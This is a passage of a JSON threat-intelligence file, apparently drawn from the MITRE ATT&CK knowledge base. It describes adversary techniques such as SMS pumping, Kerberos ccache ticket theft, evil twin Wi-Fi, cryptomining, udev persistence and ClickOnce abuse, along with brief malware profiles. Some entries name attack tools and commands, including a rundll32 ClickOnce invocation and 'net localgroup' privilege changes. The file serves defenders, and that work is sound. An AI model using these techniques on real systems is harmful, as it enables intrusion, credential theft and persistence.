    "description": "Adversaries may leverage messaging services for SMS pumping, which may impact system and/or hosted service availability.(Citation: Twilio SMS Pumping) SMS pumping is a type of telecommunications fraud whereby a threat actor first obtains a set of phone numbers from a telecommunications provider, then leverages a victims messaging infrastructure to send large amounts of SMS messages to numbers in that set. By generating SMS traffic to their phone number set, a threat actor may earn payments from the telecommunications provider.(Citation: Twilio SMS Pumping Fraud)Threat actors often use publicly available web forms, such as one-time password (OTP) or account verification fields, in order to generate SMS traffic. These fields may leverage services such as Twilio, AWS SNS, and Amazon Cognito in the background.(Citation: Twilio SMS Pumping)(Citation: AWS RE:Inforce Threat Detection 2024) In response to the large quantity of requests, SMS costs may increase and communication channels may become overwhelmed.(Citation: Twilio SMS Pumping)",
    "similar_words": [
      "SMS Pumping"
    ],
    "id": "T1496.003"
  },
  "attack-pattern--241f9ea8-f6ae-4f38-92f5-cef5b7e539dd": {
    "name": "Publish/Subscribe Protocols",
    "example_uses": [
      "communicates to servers operated by Google using the Jabber/XMPP protocol for C2."
    ],
    "description": "Adversaries may communicate using publish/subscribe (pub/sub) application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Protocols such as MQTT, XMPP, AMQP, and STOMP use a publish/subscribe design, with message distribution managed by a centralized broker.(Citation: wailing crab sub/pub)(Citation: Mandiant APT1 Appendix) Publishers categorize their messages by topics, while subscribers receive messages according to their subscribed topics.(Citation: wailing crab sub/pub) An adversary may abuse publish/subscribe protocols to communicate with systems under their control from behind a message broker while also mimicking normal, expected traffic.",
    "similar_words": [
      "Publish/Subscribe Protocols"
    ],
    "id": "T1071.005"
  },
  "attack-pattern--394220d9-8efc-4252-9040-664f7b115be6": {
    "name": "Ccache Files",
    "example_uses": [
      "tools  such as getST.py or ticketer.py  can be used to steal or forge Kerberos tickets using ccache files given a password hash aesKey or TGT."
    ],
    "description": "Adversaries may attempt to steal Kerberos tickets stored in credential cache files (or ccache). These files are used for short term storage of a user's active session credentials. The ccache file is created upon user authentication and allows for access to multiple services without the user having to re-enter credentials. The /etc/krb5.conf configuration file and the KRB5CCNAME environment variable are used to set the storage location for ccache entries. On Linux, credentials are typically stored in the `/tmp` directory with a naming format of `krb5cc_%UID%` or `krb5.ccache`. On macOS, ccache entries are stored by default in memory with an `API:{uuid}` naming scheme. Typically, users interact with ticket storage using kinit, which obtains a Ticket-Granting-Ticket (TGT) for the principal; klist, which lists obtained tickets currently held in the credentials cache; and other built-in binaries.(Citation: Kerberos GNU/Linux)(Citation: Binary Defense Kerberos Linux)Adversaries can collect tickets from ccache files stored on disk and authenticate as the current user without their password to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks. Adversaries can also use these tickets to impersonate legitimate users with elevated privileges to perform [Privilege Escalation](https://attack.mitre.org/tactics/TA0004). Tools like Kekeo can also be used by adversaries to convert ccache files to Windows format for further [Lateral Movement](https://attack.mitre.org/tactics/TA0008). On macOS, adversaries may use open-source tools or the Kerberos framework to interact with ccache files and extract TGTs or Service Tickets via lower-level APIs.(Citation: SpectorOps Bifrost Kerberos macOS 2019)(Citation: Linux Kerberos Tickets)(Citation: Brining MimiKatz to Unix)(Citation: Kekeo) ",
    "similar_words": [
      "Ccache Files"
    ],
    "id": "T1558.005"
  },
  "attack-pattern--3e6831b2-bf4c-4ae6-b328-2e7c6633b291": {
    "name": "Additional Local or Domain Groups",
    "example_uses": [
      "has added user accounts to local Admin groups.",
      "has added user accounts to the User and Admin groups.",
      "has been known to add created accounts to local admin groups to maintain elevated access.",
      "The `net localgroup` and `net group` commands in  can be used to add existing users to local and domain groups.",
      "has added a user named DefaultAccount to the Administrators and Remote Desktop Users groups.",
      "has created their own accounts with Local Administrator privileges to maintain access to systems with short-cycle credential rotation.",
      "has added newly created accounts to the administrators group to maintain elevated access.",
      "has assigned newly created accounts the sysadmin role to maintain persistence.",
      "elevates accounts created through the malware to the local administration group during execution.",
      "has added a user named supportaccount to the Remote Desktop Users and Administrators groups.",
      "has added accounts to specific groups with net localgroup."
    ],
    "description": "An adversary may add additional local or domain groups to an adversary-controlled account to maintain persistent access to a system or domain.On Windows, accounts may use the `net localgroup` and `net group` commands to add existing users to local and domain groups.(Citation: Microsoft Net Localgroup)(Citation: Microsoft Net Group) On Linux, adversaries may use the `usermod` command for the same purpose.(Citation: Linux Usermod)For example, accounts may be added to the local administrators group on Windows devices to maintain elevated privileges. They may also be added to the Remote Desktop Users group, which allows them to leverage [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) to log into the endpoints in the future.(Citation: Microsoft RDP Logons) On Linux, accounts may be added to the sudoers group, allowing them to persistently leverage [Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003) for elevated privileges. In Windows environments, machine accounts may also be added to domain groups. This allows the local SYSTEM account to gain privileges on the domain.(Citation: RootDSE AD Detection 2022)",
    "similar_words": [
      "Additional Local or Domain Groups"
    ],
    "id": "T1098.007"
  },
  "attack-pattern--48b836c6-e4ca-435a-82a3-29c03e5b492e": {
    "name": "Evil Twin",
    "example_uses": [
      "has used a Wi-Fi Pineapple to set up Evil Twin Wi-Fi Poisoning for the purposes of capturing victim credentials or planting espionage-oriented malware."
    ],
    "description": "Adversaries may host seemingly genuine Wi-Fi access points to deceive users into connecting to malicious networks as a way of supporting follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or [Input Capture](https://attack.mitre.org/techniques/T1056).(Citation: Australia Evil Twin)By using a Service Set Identifier (SSID) of a legitimate Wi-Fi network, fraudulent Wi-Fi access points may trick devices or users into connecting to malicious Wi-Fi networks.(Citation: Kaspersky evil twin)(Citation: medium evil twin)  Adversaries may provide a stronger signal strength or block access to Wi-Fi access points to coerce or entice victim devices into connecting to malicious networks.(Citation: specter ops evil twin)  A Wi-Fi Pineapple  a network security auditing and penetration testing tool  may be deployed in Evil Twin attacks for ease of use and broader range. Custom certificates may be used in an attempt to intercept HTTPS traffic. Similarly, adversaries may also listen for client devices sending probe requests for known or previously connected networks (Preferred Network Lists or PNLs). When a malicious access point receives a probe request, adversaries can respond with the same SSID to imitate the trusted, known network.(Citation: specter ops evil twin)  Victim devices are led to believe the responding access point is from their PNL and initiate a connection to the fraudulent network.Upon logging into the malicious Wi-Fi access point, a user may be directed to a fake login page or captive portal webpage to capture the victims credentials. Once a user is logged into the fraudulent Wi-Fi network, the adversary may able to monitor network activity, manipulate data, or steal additional credentials. Locations with high concentrations of public Wi-Fi access, such as airports, coffee shops, or libraries, may be targets for adversaries to set up illegitimate Wi-Fi access points. ",
    "similar_words": [
      "Evil Twin"
    ],
    "id": "T1557.004"
  },
  "attack-pattern--49fca0d2-685d-41eb-8bd4-05451cc3a742": {
    "name": "Mutual Exclusion",
    "example_uses": [
      "uses the last 64 bytes of the binary to compute a mutex name. If the generated name is invalid it will default to the generic `mymutex`.",
      "attempts to create a mutex using a hard-coded value to ensure that no other instances of itself are running on the host.",
      "creates a mutex using either a custom or default value.",
      "creates a mutex using the hard-coded value ` {12d61a41-4b74-7610-a4d8-3028d2f56395}` to ensure that only one instance of itself is running.",
      "creates a mutex using the hard-coded value `{531511FA-190D-5D85-8A4A-279F2F592CC7}` to ensure that only one instance of itself is running.",
      "will check for the presence of a hard-coded mutex `dsajdhas.0` before executing.",
      "When executed  attempts to create and lock a runtime file `/var/run/initd.lock` and exits if it fails using the specified file resulting in a makeshift mutex.",
      "can create and check for a mutex containing a hash of the `MachineGUID` value at execution to prevent running more than one instance.",
      "creates a mutex during installation to prevent duplicate execution.",
      "variants include the use of mutex values based on the victim system name to prevent reinfection.",
      "has created a mutex to avoid duplicate execution."
    ],
    "description": "Adversaries may constrain execution or actions based on the presence of a mutex associated with malware. A mutex is a locking mechanism used to synchronize access to a resource. Only one thread or process can acquire a mutex at a given time.(Citation: Microsoft Mutexes)While local mutexes only exist within a given process, allowing multiple threads to synchronize access to a resource, system mutexes can be used to synchronize the activities of multiple processes.(Citation: Microsoft Mutexes) By creating a unique system mutex associated with a particular malware, adversaries can verify whether or not a system has already been compromised.(Citation: Sans Mutexes 2012)In Linux environments, malware may instead attempt to acquire a lock on a mutex file. If the malware is able to acquire the lock, it continues to execute; if it fails, it exits to avoid creating a second instance of itself.(Citation: Intezer RedXOR 2021)(Citation: Deep Instinct BPFDoor 2023)Mutex names may be hard-coded or dynamically generated using a predictable algorithm.(Citation: ICS Mutexes 2015)",
    "similar_words": [
      "Mutual Exclusion"
    ],
    "id": "T1480.002"
  },
  "attack-pattern--718cb208-6446-4572-a2f0-9c799c60091e": {
    "name": "Bandwidth Hijacking",
    "example_uses": [],
    "description": "Adversaries may leverage the network bandwidth resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. Adversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitate [Network Denial of Service](https://attack.mitre.org/techniques/T1498) campaigns and/or to seed malicious torrents.(Citation: GoBotKR) Alternatively, they may engage in proxyjacking by selling use of the victims' network bandwidth and IP address to proxyware services.(Citation: Sysdig Proxyjacking) Finally, they may engage in internet-wide scanning in order to identify additional targets for compromise.(Citation: Unit 42 Leaked Environment Variables 2024)In addition to incurring potential financial costs or availability disruptions, this technique may cause reputational damage if a victims bandwidth is used for illegal activities.(Citation: Sysdig Proxyjacking)",
    "similar_words": [
      "Bandwidth Hijacking"
    ],
    "id": "T1496.002"
  },
  "attack-pattern--924d273c-be0d-4d8d-af58-2dddb15ef1e2": {
    "name": "Cloud Service Hijacking",
    "example_uses": [],
    "description": "Adversaries may leverage compromised software-as-a-service (SaaS) applications to complete resource-intensive tasks, which may impact hosted service availability. For example, adversaries may leverage email and messaging services, such as AWS Simple Email Service (SES), AWS Simple Notification Service (SNS), SendGrid, and Twilio, in order to send large quantities of spam / [Phishing](https://attack.mitre.org/techniques/T1566) emails and SMS messages.(Citation: Invictus IR DangerDev 2024)(Citation: Permiso SES Abuse 2023)(Citation: SentinelLabs SNS Sender 2024) Alternatively, they may engage in LLMJacking by leveraging reverse proxies to hijack the power of cloud-hosted AI models.(Citation: Sysdig LLMJacking 2024)(Citation: Lacework LLMJacking 2024)In some cases, adversaries may leverage services that the victim is already using. In others, particularly when the service is part of a larger cloud platform, they may first enable the service.(Citation: Sysdig LLMJacking 2024) Leveraging SaaS applications may cause the victim to incur significant financial costs, use up service quotas, and otherwise impact availability. ",
    "similar_words": [
      "Cloud Service Hijacking"
    ],
    "id": "T1496.004"
  },
  "attack-pattern--a718a0c8-5768-41a1-9958-a1cc3f995e99": {
    "name": "Compute Hijacking",
    "example_uses": [
      "can use system resources to mine cryptocurrency dropping XMRig to mine Monero.",
      "is a kernel-mode rootkit used for cryptocurrency mining.",
      "has loaded coinmining software onto systems to mine for Koto cryptocurrency.",
      "has distributed cryptomining malware.",
      "can download an additional module which has a cryptocurrency mining extension.",
      "harvested system resources to mine cryptocurrency using XMRig to mine Monero.",
      "can deploy follow-on cryptocurrency mining payloads.",
      "has used XMRIG to mine cryptocurrency on victim systems.",
      "has the capability to run a cryptocurrency miner on the victim machine.",
      "has deployed XMRig Docker images to mine cryptocurrency.  has also infected Docker containers and Kubernetes clusters with XMRig and used RainbowMiner and lolMiner for mining cryptocurrency.",
      "deployed a Monero cryptocurrency mining tool in a victims environment.",
      "has used xmrig to mine cryptocurrency.",
      "has created and run a Bitcoin cryptocurrency miner.",
      "During  threat actors leveraged graphics processing units (GPU) on compromised nodes for cryptocurrency mining."
    ],
    "description": "Adversaries may leverage the compute resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. One common purpose for [Compute Hijacking](https://attack.mitre.org/techniques/T1496/001) is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.(Citation: Kaspersky Lazarus Under The Hood Blog 2017) Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for [Compute Hijacking](https://attack.mitre.org/techniques/T1496/001) and cryptocurrency mining.(Citation: CloudSploit - Unused AWS Regions) Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.(Citation: Unit 42 Hildegard Malware)(Citation: Trend Micro Exposed Docker APIs)Additionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure its not competing for resources.(Citation: Trend Micro War of Crypto Miners)",
    "similar_words": [
      "Compute Hijacking"
    ],
    "id": "T1496.001"
  },
  "attack-pattern--afddee82-3385-4682-ad90-eeced33f2d07": {
    "name": "Lua",
    "example_uses": [
      "has used Lua scripts to execute payloads.",
      "can use modules written in Lua for execution.",
      "has executed a Lua script through a Lua interpreter for Windows.",
      "utilizes Lua scripts for command execution."
    ],
    "description": "Adversaries may abuse Lua commands and scripts for execution. Lua is a cross-platform scripting and programming language primarily designed for embedded use in applications. Lua can be executed on the command-line (through the stand-alone lua interpreter), via scripts (.lua), or from Lua-embedded programs (through the struct lua_State).(Citation: Lua main page)(Citation: Lua state)Lua scripts may be executed by adversaries for malicious purposes. Adversaries may incorporate, abuse, or replace existing Lua interpreters to allow for malicious Lua command execution at runtime.(Citation: PoetRat Lua)(Citation: Lua Proofpoint Sunseed)(Citation: Cyphort EvilBunny)(Citation: Kaspersky Lua)",
    "similar_words": [
      "Lua"
    ],
    "id": "T1059.011"
  },
  "attack-pattern--b577dfc1-0177-4522-8d5a-782127c8592b": {
    "name": "Polymorphic Code",
    "example_uses": [
      "BendyBear changes its runtime footprint during code execution to evade signature-based defenses."
    ],
    "description": "Adversaries may utilize polymorphic code (also known as metamorphic or mutating code) to evade detection. Polymorphic code is a type of software capable of changing its runtime footprint during code execution.(Citation: polymorphic-blackberry) With each execution of the software, the code is mutated into a different version of itself that achieves the same purpose or objective as the original. This functionality enables the malware to evade traditional signature-based defenses, such as antivirus and antimalware tools.(Citation: polymorphic-sentinelone) Other obfuscation techniques can be used in conjunction with polymorphic code to accomplish the intended effects, including using mutation engines to conduct actions such as [Software Packing](https://attack.mitre.org/techniques/T1027/002), [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010), or [Encrypted/Encoded File](https://attack.mitre.org/techniques/T1027/013).(Citation: polymorphic-linkedin)(Citation: polymorphic-medium)",
    "similar_words": [
      "Polymorphic Code"
    ],
    "id": "T1027.014"
  },
  "attack-pattern--bbfbb096-6561-4d7d-aa2c-a5ee8e44c696": {
    "name": "Customer Relationship Management Software",
    "example_uses": [],
    "description": "Adversaries may leverage Customer Relationship Management (CRM) software to mine valuable information. CRM software is used to assist organizations in tracking and managing customer interactions, as well as storing customer data.Once adversaries gain access to a victim organization, they may mine CRM software for customer data. This may include personally identifiable information (PII) such as full names, emails, phone numbers, and addresses, as well as additional details such as purchase histories and IT support interactions. By collecting this data, an adversary may be able to send personalized [Phishing](https://attack.mitre.org/techniques/T1566) emails, engage in SIM swapping, or otherwise target the organizations customers in ways that enable financial gain or the compromise of additional organizations.(Citation: Bleeping Computer US Cellular Hack 2022)(Citation: Bleeping Computer Mint Mobile Hack 2021)(Citation: Bleeping Computer Bank Hack 2020)CRM software may be hosted on-premises or in the cloud. Information stored in these solutions may vary based on the specific instance or environment. Examples of CRM software include Microsoft Dynamics 365, Salesforce, Zoho, Zendesk, and HubSpot.",
    "similar_words": [
      "Customer Relationship Management Software"
    ],
    "id": "T1213.004"
  },
  "attack-pattern--cc279e50-df85-4c8e-be80-6dc2eda8849c": {
    "name": "ClickOnce",
    "example_uses": [],
    "description": "Adversaries may use ClickOnce applications (.appref-ms and .application files) to proxy execution of code through a trusted Windows utility.(Citation: Burke/CISA ClickOnce BlackHat) ClickOnce is a deployment that enables a user to create self-updating Windows-based .NET applications (i.e, .XBAP, .EXE, or .DLL) that install and run from a file share or web page with minimal user interaction. The application launches as a child process of DFSVC.EXE, which is responsible for installing, launching, and updating the application.(Citation: SpectorOps Medium ClickOnce)Because ClickOnce applications receive only limited permissions, they do not require administrative permissions to install.(Citation: Microsoft Learn ClickOnce) As such, adversaries may abuse ClickOnce to proxy execution of malicious code without needing to escalate privileges.ClickOnce may be abused in a number of ways. For example, an adversary may rely on [User Execution](https://attack.mitre.org/techniques/T1204). When a user visits a malicious website, the .NET malware is disguised as legitimate software and a ClickOnce popup is displayed for installation.(Citation: NetSPI ClickOnce)Adversaries may also abuse ClickOnce to execute malware via a [Rundll32](https://attack.mitre.org/techniques/T1218/011) script using the command `rundll32.exe dfshim.dll,ShOpenVerbApplication1`.(Citation: LOLBAS /Dfsvc.exe)Additionally, an adversary can move the ClickOnce application file to a remote users startup folder for continued malicious code deployment (i.e., [Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001)).(Citation: Burke/CISA ClickOnce BlackHat)(Citation: Burke/CISA ClickOnce Paper)",
    "similar_words": [
      "ClickOnce"
    ],
    "id": "T1127.002"
  },
  "attack-pattern--cc36eeae-2209-4e63-89d3-c97e19edf280": {
    "name": "Relocate Malware",
    "example_uses": [],
    "description": "Once a payload is delivered, adversaries may reproduce copies of the same malware on the victim system to remove evidence of their presence and/or avoid defenses. Copying malware payloads to new locations may also be combined with [File Deletion](https://attack.mitre.org/techniques/T1070/004) to cleanup older artifacts.Relocating malware may be a part of many actions intended to evade defenses. For example, adversaries may copy and rename payloads to better blend into the local environment (i.e., [Match Legitimate Resource Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation: DFIR Report Trickbot June 2023) Payloads may also be repositioned to target [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012) as well as specific locations associated with establishing [Persistence](https://attack.mitre.org/tactics/TA0003).(Citation: Latrodectus APR 2024)Relocating malicious payloads may also hinder defensive analysis, especially to separate these payloads from earlier events (such as [User Execution](https://attack.mitre.org/techniques/T1204) and [Phishing](https://attack.mitre.org/techniques/T1566)) that may have generated alerts or otherwise drawn attention from defenders.",
    "similar_words": [
      "Relocate Malware"
    ],
    "id": "T1070.010"
  },
  "attack-pattern--d349c66e-18e1-4d8b-a2d7-65af7cbd2ba0": {
    "name": "Masquerade Account Name",
    "example_uses": [
      "can create backdoor accounts with login `HelpAssistant` on domain connected systems if appropriate rights are available.",
      "has created local accounts named `help` and `DefaultAccount` on compromised machines.",
      "has created accounts disguised as legitimate backup and service accounts as well as an email administration account.",
      "has created a new user named `supportaccount`.",
      "During the   created two new accounts admin and  (System).",
      "has been known to create or enable accounts such as support_388945a0.",
      "has created Microsoft Teams accounts that spoof IT support and helpdesk members for use in application and voice phishing."
    ],
    "description": "Adversaries may match or approximate the names of legitimate accounts to make newly created ones appear benign. This will typically occur during [Create Account](https://attack.mitre.org/techniques/T1136), although accounts may also be renamed at a later date. This may also coincide with [Account Access Removal](https://attack.mitre.org/techniques/T1531) if the actor first deletes an account before re-creating one with the same name.(Citation: Huntress MOVEit 2023)Often, adversaries will attempt to masquerade as service accounts, such as those associated with legitimate software, data backups, or container cluster management.(Citation: Elastic CUBA Ransomware 2022)(Citation: Aquasec Kubernetes Attack 2023) They may also give accounts generic, trustworthy names, such as admin, help, or root.(Citation: Invictus IR Cloud Ransomware 2024) Sometimes adversaries may model account names off of those already existing in the system, as a follow-on behavior to [Account Discovery](https://attack.mitre.org/techniques/T1087).  Note that this is distinct from [Impersonation](https://attack.mitre.org/techniques/T1656), which describes impersonating specific trusted individuals or organizations, rather than user or service account names.  ",
    "similar_words": [
      "Masquerade Account Name"
    ],
    "id": "T1036.010"
  },
  "attack-pattern--f4c3f644-ab33-433d-8648-75cc03a95792": {
    "name": "Udev Rules",
    "example_uses": [],
    "description": "Adversaries may maintain persistence through executing malicious content triggered using udev rules. Udev is the Linux kernel device manager that dynamically manages device nodes, handles access to pseudo-device files in the `/dev` directory, and responds to hardware events, such as when external devices like hard drives or keyboards are plugged in or removed. Udev uses rule files with `match keys` to specify the conditions a hardware event must meet and `action keys` to define the actions that should follow. Root permissions are required to create, modify, or delete rule files located in `/etc/udev/rules.d/`, `/run/udev/rules.d/`, `/usr/lib/udev/rules.d/`, `/usr/local/lib/udev/rules.d/`, and `/lib/udev/rules.d/`. Rule priority is determined by both directory and by the digit prefix in the rule filename.(Citation: Ignacio Udev research 2024)(Citation: Elastic Linux Persistence 2024)Adversaries may abuse the udev subsystem by adding or modifying rules in udev rule files to execute malicious content. For example, an adversary may configure a rule to execute their binary each time the pseudo-device file, such as `/dev/random`, is accessed by an application. Although udev is limited to running short tasks and is restricted by systemd-udevd's sandbox (blocking network and filesystem access), attackers may use scripting commands under the action key `RUN+=` to detach and run the malicious contents process in the background to bypass these controls.(Citation: Reichert aon sedexp 2024)",
    "similar_words": [
      "Udev Rules"
    ],
    "id": "T1546.017"
  },
  "attack-pattern--fb75213f-cfb0-40bf-a02f-3bad93d6601e": {
    "name": "Messaging Applications",
    "example_uses": [
      "has accessed victim security and IT environments and Microsoft Teams to mine valuable information.",
      "threat actors search the victims Slack and Microsoft Teams for conversations about the intrusion and incident response.",
      "has searched a victim's network for organization collaboration channels like MS Teams or Slack to discover further high-privilege account credentials."
    ],
    "description": "Adversaries may leverage chat and messaging applications, such as Microsoft Teams, Google Chat, and Slack, to mine valuable information.  The following is a brief list of example information that may hold potential value to an adversary and may also be found on messaging applications: * Testing / development credentials (i.e., [Chat Messages](https://attack.mitre.org/techniques/T1552/008)) * Source code snippets * Links to network shares and other internal resources * Proprietary data(Citation: Guardian Grand Theft Auto Leak 2022)* Discussions about ongoing incident response efforts(Citation: SC Magazine Ragnar Locker 2021)(Citation: Microsoft DEV-0537)In addition to exfiltrating data from messaging applications, adversaries may leverage data from chat messages in order to improve their targeting - for example, by learning more about an environment or evading ongoing incident response efforts.(Citation: Sentinel Labs NullBulge 2024)(Citation: Permiso Scattered Spider 2023)",
    "similar_words": [
      "Messaging Applications"
    ],
    "id": "T1213.005"
  },
  "malware--02739f57-7585-4319-acd3-794ae8ff3a70": {
    "name": "Pikabot",
    "description": "[Pikabot](https://attack.mitre.org/software/S1145) is a backdoor used for initial access and follow-on tool deployment active since early 2023. [Pikabot](https://attack.mitre.org/software/S1145) is notable for extensive use of multiple encoding, encryption, and defense evasion mechanisms to evade defenses and avoid analysis. [Pikabot](https://attack.mitre.org/software/S1145) has some overlaps with [QakBot](https://attack.mitre.org/software/S0650), but insufficient evidence exists to definitively link these two malware families. [Pikabot](https://attack.mitre.org/software/S1145) is frequently used to deploy follow on tools such as [Cobalt Strike](https://attack.mitre.org/software/S0154) or ransomware variants.(Citation: Zscaler Pikabot 2023)(Citation: Elastic Pikabot 2024)(Citation: Logpoint Pikabot 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Pikabot"
    ],
    "id": "S1145"
  },
  "malware--0a6ec267-83a9-41a5-98c7-57c3ff81e11f": {
    "name": "VersaMem",
    "description": "[VersaMem](https://attack.mitre.org/software/S1154) is a web shell designed for deployment to Versa Director servers following exploitation. Discovered in August 2024, [VersaMem](https://attack.mitre.org/software/S1154) was used during [Versa Director Zero Day Exploitation](https://attack.mitre.org/campaigns/C0039) by [Volt Typhoon](https://attack.mitre.org/groups/G1017) to target ISPs and MSPs.  [VersaMem](https://attack.mitre.org/software/S1154) is deployed as a Java Archive (JAR) and allows for credential capture for Versa Director logon activity as well as follow-on execution of arbitrary Java payloads.(Citation: Lumen Versa 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "VersaMem"
    ],
    "id": "S1154"
  },
  "malware--28ad4983-151e-4e30-9792-768470e92b3e": {
    "name": "Playcrypt",
    "description": "[Playcrypt](https://attack.mitre.org/software/S1162) is a ransomware that has been used by [Play](https://attack.mitre.org/groups/G1040) since at least 2022 in attacks against against the business, government, critical infrastructure, healthcare, and media sectors in North America, South America, and Europe. [Playcrypt](https://attack.mitre.org/software/S1162) derives its name from adding the .play extension to encrypted files and has overlap with tactics and tools associated with Hive and Nokoyawa ransomware and infrastructure associated with Quantum ransomware.(Citation: Microsoft PlayCrypt August 2022)(Citation: CISA Play Ransomware Advisory December 2023)(Citation: Trend Micro Ransomware Spotlight Play July 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Playcrypt"
    ],
    "id": "S1162"
  },
  "malware--3058b264-fe6b-46be-8948-2d1fadaf8adf": {
    "name": "IMAPLoader",
    "description": "[IMAPLoader](https://attack.mitre.org/software/S1152) is a .NET-based loader malware exclusively associated with [CURIUM](https://attack.mitre.org/groups/G1012) operations since at least 2022. [IMAPLoader](https://attack.mitre.org/software/S1152) leverages email protocols for command and control and payload delivery.(Citation: PWC Yellow Liderc 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "IMAPLoader"
    ],
    "id": "S1152"
  },
  "malware--33139388-de0c-49ff-862a-041c315b142d": {
    "name": "DUSTTRAP",
    "description": "[DUSTTRAP](https://attack.mitre.org/software/S1159) is a multi-stage plugin framework associated with [APT41](https://attack.mitre.org/groups/G0096) operations with multiple components.(Citation: Google Cloud APT41 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "DUSTTRAP"
    ],
    "id": "S1159"
  },
  "malware--37487ff6-de2a-4c14-9e8b-ba3b97f78aaf": {
    "name": "DUSTPAN",
    "description": "[DUSTPAN](https://attack.mitre.org/software/S1158) is an in-memory dropper written in C/C++ used by [APT41](https://attack.mitre.org/groups/G0096) since 2021 that decrypts and executes an embedded payload.(Citation: Google Cloud APT41 2024)(Citation: Google Cloud APT41 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "DUSTPAN"
    ],
    "id": "S1158"
  },
  "malware--396c18b9-26fb-4435-8589-fb856502e4c4": {
    "name": "Gootloader",
    "description": "[Gootloader](https://attack.mitre.org/software/S1138) is a Javascript-based infection framework that has been used since at least 2020 as a delivery method for the Gootkit banking trojan, [Cobalt Strike](https://attack.mitre.org/software/S0154), [REvil](https://attack.mitre.org/software/S0496), and others. [Gootloader](https://attack.mitre.org/software/S1138) operates on an \"Initial Access as a Service\" model and has leveraged [SEO Poisoning](https://attack.mitre.org/techniques/T1608/006) to provide access to entities in multiple sectors worldwide including financial, military, automotive, pharmaceutical, and energy.(Citation: Sophos Gootloader)(Citation: SentinelOne Gootloader June 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Gootloader"
    ],
    "id": "S1138"
  },
  "malware--457a5e8d-d964-4130-bde3-c07bb41a093e": {
    "name": "Cuckoo Stealer",
    "description": "[Cuckoo Stealer](https://attack.mitre.org/software/S1153) is a macOS malware with characteristics of spyware and an infostealer that has been in use since at least 2024. [Cuckoo Stealer](https://attack.mitre.org/software/S1153) is a universal Mach-O binary that can run on Intel or ARM-based Macs and has been spread through trojanized versions of various potentially unwanted programs or PUP's such as converters, cleaners, and uninstallers.(Citation: Kandji Cuckoo April 2024)(Citation: SentinelOne Cuckoo Stealer May 2024)\n",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Cuckoo Stealer"
    ],
    "id": "S1153"
  },
  "malware--47ab6350-054f-4754-ba4d-e52a4e8751e2": {
    "name": "Moneybird",
    "description": "[Moneybird](https://attack.mitre.org/software/S1137) is a ransomware variant written in C++ associated with [Agrius](https://attack.mitre.org/groups/G1030) operations. The name \"Moneybird\" is contained in the malware's ransom note and as strings in the executable.(Citation: CheckPoint Agrius 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Moneybird"
    ],
    "id": "S1137"
  },
  "malware--48d96fa0-d027-45aa-a8c3-5d09f65d596d": {
    "name": "Apostle",
    "description": "[Apostle](https://attack.mitre.org/software/S1133) is malware that has functioned as both a wiper and, in more recent versions, as ransomware.  [Apostle](https://attack.mitre.org/software/S1133) is written in .NET and shares various programming and functional overlaps with [IPsec Helper](https://attack.mitre.org/software/S1132).(Citation: SentinelOne Agrius 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Apostle"
    ],
    "id": "S1133"
  },
  "malware--4e385fa6-ebe0-43fc-9ccf-5b51b5dc4d79": {
    "name": "Raspberry Robin",
    "description": "[Raspberry Robin](https://attack.mitre.org/software/S1130) is initial access malware first identified in September 2021, and active through early 2024. The malware is notable for spreading via infected USB devices containing a malicious LNK object that, on execution, retrieves remote hosted payloads for installation. [Raspberry Robin](https://attack.mitre.org/software/S1130) has been widely used against various industries and geographies, and as a precursor to information stealer, ransomware, and other payloads such as [SocGholish](https://attack.mitre.org/software/S1124), [Cobalt Strike](https://attack.mitre.org/software/S0154), [IcedID](https://attack.mitre.org/software/S0483), and [Bumblebee](https://attack.mitre.org/software/S1039).(Citation: TrendMicro RaspberryRobin 2022)(Citation: RedCanary RaspberryRobin 2022)(Citation: HP RaspberryRobin 2024) The DLL componenet in the [Raspberry Robin](https://attack.mitre.org/software/S1130) infection chain is also referred to as \"Roshtyak.\"(Citation: Avast RaspberryRobin 2022) The name \"Raspberry Robin\" is used to refer to both the malware as well as the threat actor associated with its use, although the Raspberry Robin operators are also tracked as <code>Storm-0856</code> by some vendors.(Citation: Microsoft RaspberryRobin 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Raspberry Robin"
    ],
    "id": "S1130"
  },
  "malware--51f78dfc-52f9-424e-8753-bb4246188313": {
    "name": "Nightdoor",
    "description": "[Nightdoor](https://attack.mitre.org/software/S1147) is a backdoor exclusively associated with [Daggerfly](https://attack.mitre.org/groups/G1034) operations. [Nightdoor](https://attack.mitre.org/software/S1147) uses common libraries with [MgBot](https://attack.mitre.org/software/S1146) and [MacMa](https://attack.mitre.org/software/S1016), linking these malware families together.(Citation: ESET EvasivePanda 2024)(Citation: Symantec Daggerfly 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Nightdoor"
    ],
    "id": "S1147"
  },
  "malware--542e3384-341a-455b-bb48-4917b25e3b00": {
